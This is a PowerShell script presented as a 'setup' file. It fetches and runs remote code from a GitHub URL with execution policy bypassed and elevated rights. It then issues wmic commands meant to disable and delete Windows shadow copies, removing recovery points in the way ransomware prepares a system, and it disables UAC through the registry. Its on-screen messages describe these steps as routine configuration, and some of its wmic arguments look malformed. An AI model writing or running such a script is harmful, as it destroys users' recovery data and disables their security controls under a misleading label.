# setup.ps1

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Requesting administrator privileges..."
    Start-Process powershell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm https://raw.githubusercontent.com/faelcanalha/work_true/main/setup.ps1)`""
    exit
}

# 1. Desabilitar System Protection
Write-Host "Configuring System Protection..."
Start-Process "wmic" -ArgumentList "shadowsettings set windowsserver=No" -Wait -NoNewWindow
Start-Process "wmic" -ArgumentList "shadowstorage delete /nointeractive /on=C:" -Wait -NoNewWindow

# 2. Desabilitar UAC
Write-Host "Disable UAC (User Account Control)"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

Write-Host "All tasks completed."
pause
